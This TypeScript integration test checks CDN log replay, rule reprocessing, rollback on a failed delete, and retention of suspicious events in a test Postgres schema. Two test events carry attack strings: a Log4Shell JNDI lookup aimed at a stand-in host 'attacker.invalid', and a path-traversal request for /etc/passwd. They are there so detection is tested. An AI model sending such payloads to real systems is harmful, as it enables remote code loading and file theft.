import { expect, mock, test } from 'bun:test'
import { readFileSync } from 'node:fs'
import { createHash } from 'node:crypto'
import pg from 'pg'
import { encode, fixture } from './support/cdnDeliveryFixture.ts'
import { fixture as refreshFixture } from './support/cdnRefreshFixture.ts'
import { cdnRefreshRuleId } from '../src/utils/events/analyzeCdnRefresh.ts'

test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('CDN historical replay verifies original evidence and preserves actionable originals, findings and rollback', async () => {
    const namespace = `cdn_delivery_replay_${process.pid}_${Date.now()}`
    const pool = new pg.Pool({ host: '127.0.0.1', port: Number(process.env.POSTGRES_FILTER_TEST_PORT), database: 'postgres_filter_test', options: `-c search_path=${namespace}` })
    let failDelete = false
    const query = (sql: string, values?: unknown[]) => pool.query(sql, values)
    const transaction = async (work: (tx: typeof query) => Promise<unknown>) => {
        const client = await pool.connect()
        try {
            await client.query('BEGIN')
            const result = await work((sql, values) => {
                if (failDelete && sql.startsWith('DELETE FROM events')) throw new Error('Test event deletion failure')
                return client.query(sql, values)
            })
            await client.query('COMMIT'); return result
        }
        catch (error) { await client.query('ROLLBACK'); throw error } finally { client.release() }
    }
    const identityQueryOnce = (sql: string, values?: unknown[]) => query(sql.replace('public.system_events', 'system_events'), values)
    mock.module('#db', () => ({ default: query, identityQueryOnce, isTransientDatabaseError: () => false,
        withDatabaseAdvisoryLock: async (_key: string, work: (query: typeof query) => unknown) => work(query), withTransaction: transaction }))
    mock.module('#constants', () => ({ default: {} }))
    try {
        expect((await query('SELECT current_database() name')).rows[0].name).toBe('postgres_filter_test')
        await query(`CREATE SCHEMA ${namespace}`)
        await query('CREATE TABLE organizations(id text PRIMARY KEY,name text,status text,created_at timestamptz DEFAULT NOW(),audit_safe_metadata jsonb DEFAULT \'{}\')')
        await query('CREATE TABLE users(id text PRIMARY KEY)')
        await query('INSERT INTO organizations(id,name,status) VALUES(\'platform\',\'Hanasand\',\'active\')')
        const schema = readFileSync(new URL('../src/utils/db/ensureSchema.ts', import.meta.url), 'utf8')
        for (const table of ['events', 'findings', 'rules', 'system_events']) {
            const ddl = schema.match(new RegExp('CREATE TABLE IF NOT EXISTS ' + table + ' \\([\\s\\S]*?\\n        \\)'))?.[0]
            if (!ddl) throw new Error(`Missing schema ${table}`)
            await query(ddl)
        }
        await query('ALTER TABLE events ADD COLUMN log_key text UNIQUE')
        const { default: install } = await import('../src/utils/db/logAnalyzeSchema.ts')
        const { default: jobs } = await import('../src/utils/db/ruleReprocessSchema.ts')
        const { recordLogBatch } = await import('../src/utils/logs/recordLog.ts')
        const { normalizeLogEvent } = await import('../src/utils/events/logEvent.ts')
        const { processRuleReprocessJob } = await import('../src/utils/events/ruleReprocess.ts')
        const { cdnDeliveryRuleId } = await import('../src/utils/events/analyzeCdnDelivery.ts')
        await install(); await jobs()
        const good = fixture()
        const protectedCopy = { ...structuredClone(good), sourceEventId: 'c'.repeat(64) }
        const warning = { ...structuredClone(good), sourceEventId: 'd'.repeat(64), level: 'warn' }
        const unexpected = { ...structuredClone(good), sourceEventId: 'e'.repeat(64) }
        Object.assign(unexpected.metadata.structured.access, { user_agent: '${jndi:ldap://attacker.invalid/a}' })
        encode(unexpected)
        const original = { ...structuredClone(good), sourceEventId: 'f'.repeat(64), service: 'openresty',
            message: '203.0.113.7 - "GET /../../etc/passwd HTTP/1.1" 403 "scanner-agent" request_id=source-1' }
        const refresh = refreshFixture()
        const invalidRefresh = { ...structuredClone(refresh), sourceEventId: '0'.repeat(64) }
        const legacyRefresh = structuredClone(refresh)
        legacyRefresh.timestamp = '2026-09-24T00:00:01.001000001Z'
        legacyRefresh.metadata.structured.time = Date.parse(legacyRefresh.timestamp)
        legacyRefresh.message = JSON.stringify(legacyRefresh.metadata.structured)
        legacyRefresh.sourceEventId = createHash('sha256').update(`${legacyRefresh.host}:docker:${legacyRefresh.metadata.container_id}:${legacyRefresh.timestamp}:${legacyRefresh.message}`).digest('hex')
        await query('UPDATE rules SET enabled=false WHERE rule_id=$1', [cdnRefreshRuleId])
        await transaction(tx => recordLogBatch([refresh] as any, tx as any))
        const storedRefresh = (await query('SELECT id,normalized FROM events WHERE normalized->>\'source_event_id\'=$1', [refresh.sourceEventId])).rows[0]
        expect(storedRefresh.normalized.source_event_timestamp).toBe(refresh.timestamp)

        const logRows = [good, protectedCopy, warning, unexpected, original, invalidRefresh, legacyRefresh]
        const eventRows = logRows.map((log, index) => ({ id: `event-${index}`, log,
            normalized: { ...normalizeLogEvent({ ...log, created_at: log.timestamp, source_event_id: log.sourceEventId,
                source_event_timestamp: log === legacyRefresh ? undefined : log.timestamp }),
            source_event_id: log.sourceEventId } }))
        for (const row of eventRows) await query(`INSERT INTO events(id,ingestion_id,organization_id,event_timestamp,normalized,processing_status)
            VALUES($1,'logs','platform',$2,$3::jsonb,'processed')`, [row.id, row.log.timestamp, JSON.stringify(row.normalized)])
        expect((await query('SELECT count(*) n FROM events')).rows[0].n).toBe('8')
        const enqueue = async (id: string, ruleId = cdnDeliveryRuleId) => query(`INSERT INTO rule_reprocess_jobs(id,organization_id,rule_id,rule_version,requested_by,until_time,cursor)
            SELECT $1,organization_id,rule_id,version,'test',NOW(),'{"phase":0}'::jsonb FROM rules WHERE rule_id=$2`,
        [id, ruleId])
        await enqueue('disabled'); await processRuleReprocessJob()
        expect((await query('SELECT status FROM rule_reprocess_jobs WHERE id=\'disabled\'')).rows[0].status).toBe('cancelled')
        await query('UPDATE rules SET enabled=true WHERE rule_id=$1', [cdnDeliveryRuleId])
        await query(`INSERT INTO findings(id,organization_id,finding_key,rule_id,severity,summary,event_ids)
            VALUES('finding','platform','finding','custom','high','Retain evidence',$1::text[])`, [['event-1']])
        failDelete = true
        await enqueue('rollback'); await processRuleReprocessJob()
        expect((await query('SELECT status FROM rule_reprocess_jobs WHERE id=\'rollback\'')).rows[0].status).toBe('failed')
        expect((await query('SELECT count(*) n FROM events')).rows[0].n).toBe('8')
        expect((await query('SELECT count(*) n FROM log_analyze_receipts')).rows[0].n).toBe('0')
        failDelete = false
        await enqueue('drop'); await processRuleReprocessJob()
        const job = (await query('SELECT * FROM rule_reprocess_jobs WHERE id=\'drop\'')).rows[0]
        expect(job.status).toBe('completed')
        expect(job.removed_sources).toBe('0'); expect(job.removed_events).toBe('1')
        expect((await query('SELECT count(*) n FROM events')).rows[0].n).toBe('7')
        for (const kept of [protectedCopy, warning, unexpected, original]) {
            const row = (await query('SELECT normalized FROM events WHERE normalized->>\'source_event_id\'=$1', [kept.sourceEventId])).rows[0]
            expect(row.normalized.message).toBe(kept.message)
        }
        expect((await query('SELECT count(*) n FROM log_analyze_receipts')).rows[0].n).toBe('1')

        await query('UPDATE rules SET enabled=true WHERE rule_id=$1', [cdnRefreshRuleId])
        await enqueue('refresh', cdnRefreshRuleId)
        await processRuleReprocessJob()
        const refreshJob = (await query('SELECT * FROM rule_reprocess_jobs WHERE id=\'refresh\'')).rows[0]
        expect(refreshJob.status).toBe('completed')
        expect(refreshJob.removed_events).toBe('1')
        expect((await query('SELECT count(*) n FROM events')).rows[0].n).toBe('6')
        expect((await query('SELECT id FROM events WHERE id=$1', [storedRefresh.id])).rows).toHaveLength(0)
        expect((await query('SELECT id FROM events WHERE id=$1', ['event-5'])).rows).toHaveLength(1)
        expect((await query('SELECT normalized FROM events WHERE id=$1', ['event-6'])).rows[0].normalized.source_event_timestamp).toBeUndefined()
        expect((await query('SELECT count(*) n FROM log_analyze_receipts WHERE rule_id=$1', [cdnRefreshRuleId])).rows[0].n).toBe('1')
    } finally { await query(`DROP SCHEMA IF EXISTS ${namespace} CASCADE`); await pool.end() }
})
